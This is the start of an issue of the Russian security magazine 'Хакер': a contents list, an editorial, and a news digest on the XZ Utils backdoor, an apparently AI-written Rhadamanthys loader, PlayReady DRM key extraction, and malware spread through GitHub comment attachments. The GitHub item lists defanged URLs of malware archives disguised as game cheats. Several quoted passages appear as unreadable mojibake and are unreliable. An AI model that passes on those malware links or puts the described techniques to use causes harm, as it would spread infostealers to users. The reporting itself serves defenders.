
            № 301
CONTENTS


    Незаметная революция
  Колонка главреда

    MEGANews
  Самые важ ные события в мире инфосека за апрель

    Виртуальная магия
  Исполь зуем эму ляцию и вир туали зацию для пивотин га

    Виртуальная магия 2
  Исполь зуем эму ляцию и вир туали зацию при атаках

    Обзор перспективных исследований
  Колонка Дениса Макрушина

    Гид по реверсу
  Тренируемся анализировать бинарные фай лы на примере libexif

    Расшифруй, если сможешь
  Изучаем устрой ство тро яна-энко дера и создаем программу дешифровки

    Уроки форензики
  Разбираемся с Credential Stufng и рас следуем атаку на Linux

     Threadless Injection
  Делаем инъекции в чужие про цессы, чтобы обой ти EDR

    Как работает EDR
  Под робно разбираем механизмы антивирусной защиты

     Kali Ashes
  Закаля ем хакер ский дистр и учимся не шуметь в сети

    HTB Hospital
  Получа ем дос туп к хосту через уязвимость Ghostscript

    HTB Rebound
  Проводим слож ную атаку на Active Directory

    HTB Codify
  Выходим из песочницы vm2

    HTB Surveillance
  Эксплуатируем инъекцию команд через скрипт ZoneMinder

    Липовый соникс
  Ре версим кар тридж Liposonix и пишем его эмулятор

    EIGRP Scam
  От равля ем таблицу мар шрутиза ции на Python

    Картинки в водопаде
  Учим ся рисовать изображения радовол нами

    Титры
  Кто дела ет этот журнал
HEADER





Последние лет десять-пятнадцать у меня
часто возникало ощу щение, что взрыв ной
рост  тех нологий  заканчива ется.  Давно
не было такого, как в девянос тые и начале
двухтысяч ных, когда компьютеры уста рева-       Андрей Письменный                                                                                      Главный редактор
ли за несколь ко лет, а айтиш ные новости         apismenny@gmail.com
ежед невно  будора жили  ум.  Только  вот
это ощущение полностью ложное!


По ясню, что я имею в виду под взрывным ростом. Возьмем, например,
2006 год, ког да я впервые вышел на работу в редакцию онлай новой «Компь-
ютерры». Тогда откры лись YouTube и Twitter, зарелизилась Windows Vista,
начали продавать ся макбуки на процес соре Intel Core, тоже новеньком.
  На следующий год появились iPhone и Android, а регистра ция в Facebook
ста ла дос тупна не толь ко ученикам аме риканских колледжей. Следующий
год — Google Chrome и App Store. И так далее: вещи, которыми мы поль зуем-
ся до сих пор (Windows Vista не в счет), сыпались на голову с порази тельной
кучностью.
  Оглянув шись назад, мож но сказать, что всё логично: человечес тво срочно
пожинало плоды, при несенные появлени ем сначала ПК, потом интернета,
а потом сотовых сетей и смар тфонов. Не может же это про должаться веч но?
Сказать сложно, но пока, похоже, продол жается.
  Недавно я пот ратил вечер на то, чтобы отобрать бесплатные статьи
«Хакера», которые можно было бы постить в соцсети по выходным. Пос коль ку
материалы, опубликованные до 2015 года, как раз все бесплатны, это оче-
видные кандидаты. Толь ко вот уровень уста ревания там такой, что смотреть
страшно.
  В первую оче редь устарело всё связанное с телефонами. Android и iOS
десятилетней дав ности выг лядят пещерными, а советы их пользовате лям
походят  на  руководства  по  затачиванию  камней  и  копанию  ловушек
на мамонтов.
   Устарели и материалы про веб-разработку. Не помогло даже то, что
«Хакер» в этой теме как раз тогда был на переднем краю и писал про вся кие
модные штуки вроде Meteor.js. Где теперь тот мете ор? Веб-разработка
за десять лет сде лала столько прыжков и кувырков, что сле дить за этой акро-
бати кой — нужна еще одна редакция.
  Отдельное удовольствие — читать старые статьи про криптовалюты, где
биток сто ит 800 бак сов, а автор рассуждает, будет ли у крипты жизнь пос ле
окончания вол ны хайпа в 2014 году. Еще как будет, милый! Да такая, что
за волнами семнадцатого и девятнадца того годов ту пер вую теперь уже и не
раз глядеть.
   Ну и конечно, максимально наивно выглядят ста рые статьи про ИИ. Да,
десять лет назад уже появи лись сверточные нейросети и уже казались чудом
из чудес. Но предста вить, насколько эта тема разовьется в двадцатых годах,
тог да было нере ально.
  А ведь это только те темы, о которых пишет «Хакер». За последнее десяти-
летие, нап ример, пол ностью преобразились сер висы дос тавки, и никого
боль ше не удивляет воз можность получать почти любые товары на сле-
дующий день (если не через двадцать минут) пос ле заказа. Рав но как не
удив ляет и мгновен ная аренда самока тов и даже автомобилей.
  При этом и то и другое — всего лишь пос ледс твия массового рас простра-
нения смартфонов. Те же ней ронки у нас на глазах прошли путь от первых
концептов до жиз неспо соб ных про дуктов. А даль ше — все больше и больше
при менений, меняющих целые отрасли и аспекты жизни.
   Да, сегодня мож но рассуждать о том, породит ли Apple Vision оче редную
революцию прямо сейчас, или подождем AR-девайса подешевле и полегче.
Или, взять, например, Sora — последнюю из нейросетей OpenAI. Можно
пожимать пле чами: мол, кому нужны эти странноватые сгенерированные
видео? Но на них-то раз витие не кончится, и дальше можно ждать новых
и новых спо собов получить от компьютера нуж ную кар тинку.





И  опять можно  взять  шире.  Развитие  околокомпьютерных  штук мы
еще худо-бедно себе представляем, но прогресс зат ронет и другие области.
Медики и биоло ги, к при меру, все эти десять лет бал деют от воз можнос ти
редак тировать геном методом CRISPR-Cas9. А что, если в иссле дованиях
будет помогать еще и современ ный ИИ?
  Или вот можешь почитать, как Хан ну Райани еми (один из моих любимых
писателей-фантастов, а ныне сооснователь и CEO стар тапа HelixNano) рас-
суждает о компь ютерной аугмента ции иммунной системы. По дороге он
еще ссы лается на интерес ный карманный девайс под названием MinION
Mk1B, пред назна ченный для секвениро вания генома. Этакий Flipper Zero
для биоме диков.





Так что, может быть, сегод ня рилсы, где люди ез дят в Apple Vision на само-
управляемых кибер траках и выгуливают роботов Boston Dynamics, — это ско-
рее хох ма, но нас троение они передают верное: будущее удивительно и нас-
тупает хоть и незаметно, но неот вратимо.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: в XZ Utils обна ружили бэкдор, Microsoft опуб-
ликовала исходники MS-DOS 4.00 под лицен зией MIT, через
ком ментарии GitHub и GitLab распространяется малварь,
YouTube про должает борьбу с бло кировщиками рек ламы,
в пиньинь-клавиатурах наш ли множес тво проблем, а так же
другие интересные события про шедшего апреля.





БЭКДОР В XZ UTILS
В популяр ном пакете XZ Utils для сжатия данных без потерь и работы с фор-
матом  .xz обнаружи ли бэкдор. Проблема  затрагивает прак тически все
основные дистрибути вы Linux, и не толь ко их. Судя по все му, злоумыш ленни-
ки несколь ко лет готовили эту ата ку и втирались в доверие к сопровождающе-
му про екта XZ Utils.
   Бэкдор, который получил идентификатор CVE-2024-3094 (и десять баллов
из десяти воз можных по шкале CVSS), случайно обнаружил спе циалист ком-
пании Microsoft и разработ чик проекта PostgreSQL Андрес Фрой нд (Andres
Freund).
  По его собствен ным словам, он занимался микробенчмаркингом и пытал-
ся стабилизировать систему, когда обратил внимание на повышенную наг-
рузку на процессор со стороны демона SSH, что вызывало задержки и уве-
личи вало вре мя вхо да в систему. Изучение проблемы привело Фрой нда
к сложному вре донос ному коду в XZ Utils. Известно, что бэкдор появил ся в XZ
Utils вер сий 5.6.0 (опуб ликована 23 февраля) и 5.6.1 (опубликована 9 марта).
   Так как XZ Utils и входящая в его сос тав биб лиотека liblzma очень популяр-
ны и вклю чены в боль шинство дистри бутивов Linux (а также используются
множеством при ложе ний для Linux и macOS), обна руже ние бэкдора взбу-
доражило все опен сорсное сообщество.
  Наличие бэкдора под твердили раз работчики Fedora (40 Beta и Rawhide),
Debian (Sid), openSUSE (Tumbleweed и MicroOS), Kali Linux (Rolling), Gentoo
и Arch Linux (Rolling).
   Также опасные версии XZ Utils успели про никнуть в Homebrew и OpenWrt,
и длинный список пострадавших про ектов, ско рее все го, про должит попол-
нять ся. К счастью, как мож но заметить, вре доносный код в основном доб-
рался лишь до бета-вер сий и версий для раз работчиков, то есть не успел
попасть в ста бильные релизы и получить по-настоящему широкое рас-
пространение.
  За появление бэкдора в коде XZ Utils ответс твенен некий Цзя Тань (Jia
Tan), также известный под ником JiaT75. Судя по версиям детальной хро ноло-
гии событий  (1, 2), составленным раз работ чиком Эваном Бохсом (Evan
Boehs) и экспертом Google Рассом Коксом (Russ Cox), атака на XZ Utils и его
соп ровождающе го  Лассе  Коллина  (Lasse  Collin  aka  Larhzu)  началась
еще в 2021 году, когда на GitHub был создан аккаунт JiaT75.
  Опе рация по внедрению бэкдора представляла собой сложную, про-
думанную ата ку, и многие полагают, что за про изошед шим могли стоять про-
фессионалы из спецслужб, а Цзя Тань — полностью вымышленная лич ность.
   Так, JiaT75 и его веро ятные сооб щники использовали несколько подстав-
ных аккаунтов, что бы постепенно убедить Коллина принять помощь Цзя Таня
в работе над про ектом и усту пить мес то новому мейнтейнеру. В то вре мя
у Коллина дей ствительно был сложный период из-за проб лем с пси хичес ким
здоровьем, и он не мог уде лять XZ Utils дол жного внимания.
   Также уже обнаружилось, что Цзя Тань не только работал над постепен-
ным внедрени ем в про ект бэкдора, но и проявлял активность за пределами
XZ Utils. Например, был найден пул-реквест в Google OSS-Fuzz, призванный
скрыть бэк дор. Кроме того, JiaT75 пытался давить на разработ чиков Fedora
и Ubuntu, чтобы те поскорее обновились до опас ных вер сий XZ Utils.
   Когда инцидент получил большой резонанс, из соображений безопас-
ности GitHub заб локировал репозитории xz, xz-java и xz-embedded, а также
аккаунты Коллина и JiaT75. Сам Лассе Коллин подтвердил ком прометацию XZ
Utils на сай те проекта tukaani.org, куда Цзя Тань не имел доступа.
  При этом сообщается, что бэкдор был внедрен не в репози торий XZ Utils,
а в TAR-архи вы. Так, вредоносный код серь езно обфусци рован, и его можно
обнаружить толь ко в полном пакете заг рузки, а не в Git-дистрибутиве, где
отсутс твует макрос M4, запускающий про цесс билда бэкдора. Если же вре-
доносный макрос при сутствует, артефакты вто рого этапа из Git-репозитория
внедряют ся во вре мя сборки.





   Схема работы бэкдора, составленная спе циалистом Microsoft Томасом Роччей


      «Ïîëó÷åííàÿ âðå äîíîñ íàÿ ñáîð êà âìå øèâà åòñÿ  â  àóòåíòèôèêà öèþ
      sshd ÷åðåç  systemd. SSH —  ýòî øèðîêî èñïîëüçóåìûé ïðîòîêîë«
      äëÿ óäà ëåííîãî ïîäêëþ ÷åíèÿ ê ñèñ òåìàì, à sshd — ñëóæáà, îáåñ-
      ïå÷èâà þùàÿ äîñ òóï, — ïèñàëè ñïå öèàëèñ òû Red Hat. — Ïðè óäà÷ íîì
      ñòå ÷åíèè îáñòîÿòåëüñòâ ýòî âìå øàòåëüñòâî ìîæåò ïîç âîëèòü çëî-
     óìûø ëåííèêó îáîéòè àóòåíòèôèêà öèþ sshd è ïîëó÷èòü íåñàíêöèîíè-
      ðîâàííûé óäà ëåííûé äîñ òóï êî âñåé ñèñ òåìå».                »
Однако теперь, когда анализом бэк дора занимаются многие ИБ-специалис-
ты, вы ясняется, что, по сути, он перехватывает и перенаправляет опе рации
рас шифровки ключей SSH RSA (функцию RSA_public_decrypt). И это позволя-
ет атакующе му изме нять способ работы ПО при выполнении опе раций, свя-
занных со сжатием или распаковкой lzma, передавать специальные аргумен-
ты во вре мя опе рации SSH-аутентификации и выполнять произвольный код
на уда ленных системах, при этом не оставляя следов в логах.
  Иссле дователи, раз работчики и даже Агентство по кибербезопас ности
и защите инфраструктуры США (CISA) приз вали всех срочно провести даун-
грейд XZ Utils до незат ронутой версии (нап ример, 5.4.6 Stable).
  Эксперты же продол жают изу чать сам бэкдор (1, 2, 3), а также анализи-
руют вклад Цзя Таня в другие про екты, помимо XZ Utils, так как любые его
ком миты и пред ложения теперь рассмат риваются как потенциаль но опас ные.


300 000 СЕРЫХ SIM-КАРТ
По запросу Рос комнад зора операторы связи блокируют в среднем око ло 300 000 SIM-карт
в неделю в рам ках борь бы с «серым» рын ком. Опе раторы говорят, что большинство бло кировок
происходит из-за неверных дан ных абонен тов, которые затем их обновляют и могут восста-
новить дос туп к услугам свя зи.


С сентября по декабрь 2023 года операторы свя зи прекратили оказание услуг по более чем
600 000 номеров с неустановленными владель цами.





ИИ ПИШЕТ МАЛВАРЬ
Аналитики Proofpoint заявили, что зло умышленни ки используют для рас-
пространения инфостилера Rhadamanthys  PowerShell-скрипт,  созданный
при помощи ИИ (нап ример, ChatGPT компании OpenAI, Gemini ком пании
Google или CoPilot ком пании Microsoft).
   Изученный спе циалистами скрипт использовал ся в марте текущего года,
в рам ках фишинговой кампании, нацеленной на десятки организа ций в Гер-
мании. По дан ным исследова телей, в этой почтовой кам пании хакеры
выдавали себя за предста вителей Metro cash-and-carry, исполь зуя инвой сы
в качес тве приманки.
  Обнаруженная активность связана с хакер ской группой TA547 (она же
Scully Spider), которая к тому же выступает бро кером первоначальных дос-
тупов. Scully Spider активны как минимум с 2017 года, и за эти годы они рас-
пространяли самую разную малварь для Windows (ZLoader/Terdot, Gootkit,
Ursnif, Corebot, Panda Banker и Atmos) и для Android (Mazar Bot и Red Alert).
  Но в пос леднее время груп па переключилась на модуль ный инфости лер
Rhadamanthys, который пос тоянно рас ширяет свои воз можнос ти по сбору
и краже данных (из буфера обме на, браузера, cookie). Этот сти лер рас-
пространяется среди киберпреступных групп с сентября 2022 года по модели
Malware-as-a-Service (MaaS, «малварь как услуга»).
  По данным Proofpoint, пись ма зло умышленников содержали защищенный
паролем MAR26 ZIP-архив, в котором находился вре доносный файл .LNK.
Обращение к файлу ярлы ка запус кало PowerShell для выполнения удаленного
скрип та.
   Анализи руя PowerShell-скрипт, заг ружа ющий Rhadamanthys, иссле дова-
тели замети ли, что тот содер жит множество сим волов #, за которы ми следуют
отдельные коммента рии для каждого компонен та. Такое нечасто встре чается
в коде, написанном человеком. Экспер ты пишут, что подобное скорее харак-
терно для кода, созданного генера тив ным ИИ, например ChatGPT, Gemini
или CoPilot.





Хотя спе циалисты не уверены до конца, что PowerShell-скрипт написан
при помощи LLM, его содержимое наводит на мысли о том, что теперь
TA547 использует генера тивный ИИ для написания или переработ ки своих
инструментов. К тому же сами исследова тели попробовали создать ана-
логичный скрипт с помощью LLM и пришли к выводу, что скрипт TA547 тоже
мог быть сге нерирован ИИ.
  Нап ример, по словам иссле дователей, разработчики обычно прекрасно
пишут код, но их ком мента рии зачастую малопо нятны и содержат грам-
матические ошиб ки.


       «PowerShell-ñêðèïò,  ïðåä ïîëîæèòåëüíî  ñîç äàííûé  LLM, òùà òåëüíî
      çàêîì ìåíòèðîâàí ñ áåçóï ðå÷íîé ãðàì ìàòèêîé. Ïî÷ òè êàæäàÿ ñòðîêà«
      êîäà ñîï ðîâîæäàåòñÿ ñîîòâåòñ òâó þùèì êîì ìåíòà ðèåì», — îòìå ÷àþò
      â Proofpoint.                »





МАСК БОРЕТСЯ С БОТАМИ
После при обретения ком пании Twitter (теперь X) в 2022 году Илон Маск пытается бороться
с засиль ем ботов и спамерских аккаунтов на платформе. Так как эти уси лия не приносят осо-
бых успехов, теперь в компании рас смат ривают воз можность сде лать публикацию сооб щений
платной для новых пользователей.
   В октябре прош лого года X уже начала взи мать пла ту в размере дол лара в год с новых
неверифицирован ных поль зователей в Новой Зелан дии и на Филиппинах. Без оплаты такой
поль зователь может толь ко читать сообщения. Теперь этот подход могут расширить и на другие
страны.

          «К  сожалению,  небольшая  плата  за  возможность  писать  сообщения→       для новых пользователей — единственный спо соб обуздать неп рекра щающий ся
       натиск ботов. Нынеш ний ИИ (и фермы троллей) с легкостью обходят бот-тесты.
      К тому же нашествие фейковых акка унтов использует доступное прос транс тво
       имен, поэтому многие хорошие имена в резуль тате ока зываются заняты», —
      пишет Илон Маск в X, добавляя, что мера затронет только новые учет ные
       записи и через три месяца после регис трации поль зователи смо гут писать бес-
       платно.





ИСХОДНИКИ MS-DOS
4.00
Microsoft опубликова ла исходный код MS-DOS 4.00, бинарники, образы дис-
ков и докумен тацию. Теперь исходный код, которо му почти 45 лет, дос тупен
под лицензией MIT, то есть мож но сво бодно с ним работать, изме нять и рас-
пространять его.
  Десять лет назад Microsoft уже передавала исходники MS-DOS 1.25 и 2.0
Музею компьютер ной исто рии, а затем пов торно опуб ликовала их и на
GitHub. В ком пании отмечают, что этот код занимает важное мес то в исто рии
операци онной системы, которая была полностью написана на ассем блере
для 8086 поч ти полвека назад.
   Те перь был обнародован и исходный код MS-DOS 4.00, отныне дос тупный
под лицензией MIT. В Microsoft напоминают, что MS-DOS 4.00 — это доволь-
но интересная версия, написанная совмес тно с IBM. В прошлом именно
от MS-DOS 4.00 было обра зовано ответ вление Multitasking DOS (или MT-
DOS), которое в ито ге не получило широкого рас пространения.
  Представите ли Microsoft расска зали, что этот релиз уви дел свет благода-
ря переписке между бывшим техничес ким дирек тором Microsoft Рэем Оззи
(Ray  Ozzie) и молодым британским исследова телем Коннором Хайдом
(Connor Hyde), также известным под ником Starfrost.
  Дело в том, что мно гие исходни ки и материалы, теперь доступные
на GitHub, были предоставлены Оззи. Когда-то дав но он работал в ком пании
Lotus и ему прислали нес колько неизданных бета-версий MS-DOS 4. С тех
пор Оззи хранил дис кеты в надежном месте, а недавно нашел их по просьбе
Хайда.
  В ито ге Starfrost связался с отделом Microsoft, который занима ется откры-
тым исходным кодом (Microsoft Open Source Programs Oﬃce, OSPO), чтобы
изучить воз можность публикации исходни ков DOS 4. Ведь сам Хайд работает
над документированием взаимос вязей между DOS 4, MT-DOS и тем, что
в ито ге ста ло OS/2.
  Отмечается, что некото рые более поздние версии бинар ников Multitasking
DOS мож но было найти в интернете, но бета-версии Оззи — это более ран-
ние копии, которые не выпускались до этого.
  В итоге вице-президент сооб щес тва раз работчиков Microsoft Скотт Хан-
сельман (Scott Hanselman) и интернет-архивист и энту зиаст Джефф Спонагл
(Jeﬀ Sponaugle) соз дали образы этих ори гинальных носителей и отсканиро-
вали пре дос тавленные оригинальные печатные документы.
  Кроме того, специалис ты Microsoft и OSPO покопались в архиве ком-
пании. Хотя им не уда лось найти полный исходный код MT-DOS, они обна-
ружили MS-DOS 4.00, которая теперь доступна на GitHub, а также допол-
нительные бета-версии бинарников, PDF-документацию и образы дисков.
В ком пании обе щают, что дополнят релиз, если попадется еще что-нибудь
интерес ное.


      «Åñëè âû çàõîòèòå çàïóñ òèòü ýòî ÏÎ ñàìîñ òîÿòåëüíî, íàì óñïåøíî
      óäà ëîñü çàïóñ òèòü åãî íà îðèãèíàëüíîì IBM PC XT, áîëåå íîâîì«
       Pentium, à òàê æå â îïåíñîð ñíûõ ýìó ëÿòîðàõ PCem è 86Box», — îòìå-
      ÷àþò â êîì ïàíèè.                »
В личном бло ге Коннор Хайд подробно рас ска зывает о том, что MS-DOS
4.00 была уни кальна и, например, обладала определенными возможностями
для многозадачности, а в ито ге лег ла в осно ву OS/2.





Так, одной из ключевых составляющих многозадачности MS-DOS 4.00 был
менеджер сессий (SM.EXE). Хайд объ ясня ет, что этот компонент системы
позволял использовать горячие клавиши и перек лючаться меж ду заранее
определен ными при ложениями (таковых могло быть до шести). Однако, судя
по собс твен ным тес там исследователя, в работе SM.EXE наблюдались серь-
езные ошибки, поэто му его использование было не слиш ком целесообразно.


2500 DDOS-АТАК НА СФЕРУ ЭНЕРГЕТИКИ
Специалисты ГК «Солар» подсчи тали, что в первом квартале 2024 года произошло более 2500
DDoS-атак на сферу энергетики. Это в 3 раза превыша ет показатель предыдущего квартала
и поч ти в 10 раз — показа тель аналогич ного периода 2023 года.





Постепенный рост атак на энер гетичес кий сектор начал ся еще в 2023 году. Так, в первом квар-
тале было совершено более 280 DDoS-атак на пред приятия отрасли, а к четвертому кварталу
их уже было 755.

Нес мотря на всплеск DDoS в энергетике, отрасль находится толь ко на 8-м мес те в переч не
наиболее ата куемых отраслей. Лидирует же госсектор, доля которо го в общем объ еме DDoS-
атак сос тавила 15%.

Традици онно  это одна  из наиболее  атакуемых  сфер,  наряду  с ИТ компани ями,  те-
леком про вайдерами и финансовыми организа циями.





В общей сложности в первом квартале 2024 года экспер ты зафиксировали око ло 119 000
DDoS-атак  на  россий ские  организации.  Это  почти  в два раза  пре вышает  показа-
тель 2023 года за ана логичный период (64 000 атак), и это самый высокий квартальный
показа тель за последний год.

Самый продол жительный DDoS длился 11 дней, а максималь ная мощ ность сос тавила 724 Гбит/
с.





                                     Продолжение статьи →
← Начало статьи





 ВЗЛОМ DRM
 MICROSOFT
  Основатель и глава польской исследова тельской компании AG  Security
  Research (ранее Security Explorations) Адам Гов дяк (Adam Gowdiak) заявил,
   что обнаружил уязвимости в технологии защиты контента PlayReady компании
   Microsoft. По его словам, эти проб лемы могут позволить недобросовес тным
  под писчи кам стриминговых сервисов незаконно ска чивать филь мы.
     Гов дяк известен сво ими исследованиями в области безопас ности Java (1,
  2, 3), а также телевизионных и стри минговых плат форм, и эти ресер чи за пос-
  ледние 16 лет не раз попадали на первые полосы изданий. Но если ранее его
  иссле дования были пос вящены платформам спутникового ТВ, телевизион-
  ным приставкам и DVB, то в последнее время Говдяк занимается вопросами
  защиты циф рового контента и их влиянием на стримин говые платформы.
     К примеру, еще в 2022 году Говдяк со общил инже нерам Microsoft, что ему
  удалось скачать контент, защищенный PlayReady, с Canal+, премиальной
  VOD-плат формы в Поль ше. Это исследование включало взлом телевизион-
  ных приставок для получения клю чей, необходимых для дос тупа к защищен-
  ному контенту.
     Тог да Canal+ проигнорировала попыт ки исследователя добиться устра-
  нения уяз вимос ти, а год спустя и вовсе сообщила, что закрывает уяз вимую
   плат форму. То есть в ком пании так и не признали работу Говдяка. А в
   Microsoft тогда заявили СМИ, что «опи санные проблемы касаются настроек,
  контро лируемых пос тавщиком услуг, и безопасности стороннего кли ента»,
  под черкнув, что речь не идет об уязвимос ти в служ бе или клиенте Microsoft.
    Однако Гов дяк про должил изучать безопасность  Microsoft PlayReady
  и теперь обратил вни мание на международные стри минговые сервисы,
  которые исполь зуют PlayReady для защиты контента.
     PlayReady представ ляет собой технологию предот вращения копирования
  медиафайлов, которая включает  в себя шифрование, предот вращение
  вывода и DRM. Microsoft утверждает, что это «самая распространенная тех-
  нология защиты контента в мире».
    В новом иссле довании Говдяк обошелся без взлома телевизионных прис-
   тавок. Теперь ата ка нап равлена на сами технологии Protected Media Path
   (PMP), которые обеспечивают безопас ность кон тента в средах Windows,
  а также на компилятор Warbird, раз работанный Microsoft для усложнения
  реверс-инжиниринга ком понентов Windows.
     Найденные им уязвимости в ком понентах PMP могут использоваться
  для получе ния доступа к тексто вым ключам кон тента, которые защищает
   PlayReady. И эти ключи могут позволить вошед шему в систему поль зователю
  рас шифровать кон тент популярных стримин говых сервисов.


         «Àòà êà  îñó ùåñòâëÿåòñÿ  ÷åðåç  èñïîëüçîâàíèå  âðå ìåííîãî  îêíà,
         â òå÷åíèå êîòîðîãî êëþ ÷è êîíòåíòà èìå þò XOR-ôîð ìó, — òåê ñòîâîå «
         çíà ÷åíèå òàêèõ êëþ ÷åé ìîæåò áûòü ïîëó÷å íî ñ ïîìîùüþ ïðîñ òîé îïå-
        ðàöèè XOR ñ 128-áèòíîé êëþ ÷åâîé magic-ïîñ ëåäîâà òåëüíîñòüþ, —
        ñîîáùàåòñÿ â áëîãå Security Explorations. — Íàøè òåñ òû ïîêàçà ëè, ÷òî
         â âåð ñèÿõ Windows, âûïóùåííûõ ïîñ ëå 2022 ãîäà, èñïîëüçóþòñÿ òîëü-
         êî äâå  òàêèå ïîñ ëåäîâà òåëüíîñ òè  (îäíà äëÿ Windows  10, äðó ãàÿ
         äëÿ Windows 11)».                 »
  В качестве  proof-of-concept исследова тель продемонс трировал заг рузку
  фильмов с Canal+ и получение ключа кон тента для фильма Netix. Одна ко
  под черки вается, что эта атака может работать и против других платформ,
  включая HBO Max, Amazon Prime Video и Sky Showtime. Говдяк утверждает, что
  ему удалось ска чать фильмы в HD-качестве на локаль ный накопитель и прос-
  мотреть их с помощью Windows Media Player.


        «Çëîóìûø ëåííèêó íóæíà òîëüêî Windows è äîñ òóï (ïîäïèñêà) ê ñòðè-
        ìèíãîâîé ïëàòôîðìå, — îáúÿñíÿåò Ãîâ äÿê. — Ëþáîé ïîëüçîâàòåëü «
        Windows ìîæåò èçâëå÷ü êëþ ÷è äëÿ ôèëüìîâ èç ñòðèìèíãîâûõ ïëàò-
        ôîðì, êîòîðûå èñïîëüçóþò óÿç âèìóþ òåõíîëîãèþ Microsoft PlayReady
         äëÿ çàùèòû êîíòåíòà».                 »
  По ка специалист не обнародовал никаких техничес ких подробностей и отме-
   тил, что эксплуатация багов не так проста: исследование заняло девять
  месяцев, в дополнение к шести месяцам, потраченным на анализ PlayReady
  еще в 2022 году.
    Более того, Говдяк не предос тавил подробнос ти об уязвимостях даже
  ком пании  Microsoft. Дело в том, что он недово лен тем, как ком пания
  отнеслась к его пре дыдущему отчету об уязвимос ти в PlayReady, ведь его
   работа, по сути, была проигно рирована.
     Как пишет Говдяк, на этот раз  Microsoft запросила допол нительную
  информацию о проблеме, сооб щив, что спе циалист может пре тен довать
  на получе ние вознаграждения в рам ках программы bug bounty. Но теперь
  Говдяк готов поделиться информа цией с произво дителем только в рам ках
  ком мерческого соглашения.

        «Íîâîå èññëå äîâà íèå ñîäåð æèò ïîòåíöèàëüíî öåííûå  IP, íîó  õàó,
        êîòîðûå íàì íóæíî çàùèòèòü, — ãîâîðèò ýêñïåðò. — Ê òîìó æå ðàñ êðû- «
         òèå íàøåãî íîó õàó / íàáîðà èíñ òðó ìåíòîâ êîì ïàíèè Microsoft ìîæåò
         ïîñ òàâèòü  ïîä  óãðîçó íàøè  áóäóùèå  ïðîåêòû,  îðèåíòèðîâàííûå
         íà ïëàòôîðìó Windows».                 »
  Де ло в том, что в рам ках нового исследова ния Говдяк и его коллеги раз-
  работа ли несколь ко инс тру ментов, в том чис ле набор для реверс-инжи-
  ниринга  Warbird,  позволяющий  анализировать бинарники, защищенные
   Warbird, а так же сниффер для извлечения ключей кон тента из про цесса PMP.
     Представите ли Microsoft про комменти ровали ситу ацию так:

        «Íàì èçâåñ òíî î ïðîáëåìå, çàòðàãèâà þùåé ïîä ìíîæåñ òâî êîíòåíòà,
         â êîòîðîì èñïîëüçóåòñÿ ïðîãðàì ìíîå DRM-ðåøåíèå, è ìû ðàáîòà åì «
        íàä åå ðåøåíèåì ñîâ ìåñ òíî ñ íàøèìè ïàð òíå ðàìè».                 »

  42 000 000 ДОЛЛАРОВ ВЫКУПОВ

   Согласно заявлению ФБР, CISA, Европейского центра киберпреступности Европола (EC3)
   и Наци ональ ного центра кибербезопас ности Нидерландов (NCSC-NL), с начала 2023 года шиф-
   роваль щик Akira взломал сети более 250 орга низаций и собрал около 42 мил лионов дол-
   ларов в качестве выкупов.

   Обыч но операторы Akira тре буют от пострадавших выкуп в размере от 200 тысяч до нес-
  коль ких миллионов дол ларов, в зависимос ти от размера взло манной организации.





 МАЛВАРЬ
 В КОММЕНТАРИЯХ
 GITHUB
  Ха керы злоупот ребля ют GitHub для распростра нения мал вари. Например,
  злоумышленники  исполь зуют  URL-адре са,  связанные  с  репози тори ями
   Microsoft, в результате чего файлы кажутся безопасными.
     Все началось с того, что эксперты McAfee рас сказали о фальшивом читер-
  ском ПО, которое на самом деле представляло собой модификацию
  инфостилера  RedLine. В ходе  изу чения  этой кам пании исследователи
  заметили, что вре доносные полезные наг рузки фаль шивых читов используют
  URL-адреса, связан ные с GitHub-репозиторием vcpkg, принадлежащим ком-
  пании Microsoft:
   • https://github(.)com/microsoft/vcpkg/les/14125503/Cheat.Lab.2.7.2.zip
   • https://github(.)com/microsoft/STL/les/14432565/Cheater.Pro.1.6.0.zip

  Журналистам издания Bleeping Computer показалось странным, что репози-
  торий Microsoft распространяет малварь с фев раля 2024 года, но никто этого
  не заметил, а ссы лок на упомянутые файлы в исходном коде проекта обна-
  ружить не удалось.
     Представите ли издания решили разоб раться в ситу ации и выяснили, что
  файлы не являются частью vcpkg, а были заг ружены в виде ком мента риев,
  оставленных к коммитам и issue.
    Дело в том, что, оставляя комментарий на GitHub, поль зователь может
  прикрепить к нему про извольный файл, который в итоге будет загружен
   в CDN GitHub и свя зан с соответству ющим про ектом с помощью уникального
  URL в таком формате:


  https://www.github(.)com/{project_user}/{repo_name}/files/{file_id}/{
  file_name}

  Для видео и изображений путь будет содержать /assets/.
    При этом вместо генерации URL пос ле пуб ликации ком ментария GitHub
   авто мати чески генери рует ссылку на ска чива ние сразу после добавления
  файла в еще не сохраненный комментарий. Это позволяет хакерам связывать
  свою малварь с любым репозиторием без ведома его владельцев.





  Бо лее того, даже если комментарий в ито ге не будет опубликован (или будет
  удален сразу пос ле пуб ликации), файлы не удаляются из CDN GitHub, а URL-
  адреса продолжают работать.
    Жур налисты отмечают, что в URL-адресе при этом видно название
  репози тория компании-жертвы, что поз воляет злоумышленни кам создавать
  весьма хитрые и прав доподоб ные при манки.
     Нап ример, хакер может заг рузить исполняемый файл мал вари в репози-
  торий Nvidia, и вредонос будет маскироваться под новый драйвер, исправ-
  ляющий проб лемы в какой-либо популярной игре. Или атакующий может заг-
   рузить файл в коммента рии к исходному коду Google Chromium и заявить, что
   это новая тестовая сборка браузера.
    Даже если компания узнает, что ее репозитории используются для рас-
  пространения вре доносного ПО, не существу ет никаких нас троек, позволя-
  ющих управлять файлами, прикрепленными к про ектам. То есть защитить
   аккаунт GitHub от подобных зло употреблений можно, только отключив ком-
  мента рии. А сде лать это можно лишь времен но, не более чем на шесть
  месяцев.
    Сер гей Франкофф (Sergei Frankoﬀ), спе циалист сер виса автомати зиро-
  ванного ана лиза вредоносного ПО UNPACME, еще в прошлом месяце провел
  на Twitch трансляцию, пос вященную этой проб леме, и заявил, что злоумыш-
  ленники активно ею пользуются.
    В ходе изучения проблемы Bleeping Computer удалось найти еще один
  репози торий (httprouter), который тоже использовал ся для распространения
  малвари. Причем это был тот же самый фальшивый чит Cheater.Pro.1.6.0.zip,
   что и в случае с URL-адресами Microsoft.
    Однако Франкофф сооб щил изданию, что в марте обнаружил еще одну
  ана логич ную кампанию, в которой использовался тот же LUA-загрузчик,
   SmartLoader, замас кированный под читерский софт Aimmy. По словам
  экспер та, SmartLoader обычно устанавлива ется вместе с другими полезными
   наг рузками, такими как уже упомянутый стилер RedLine.
     Представите ли  Bleeping  Computer  связались  с  GitHub  и  Microsoft
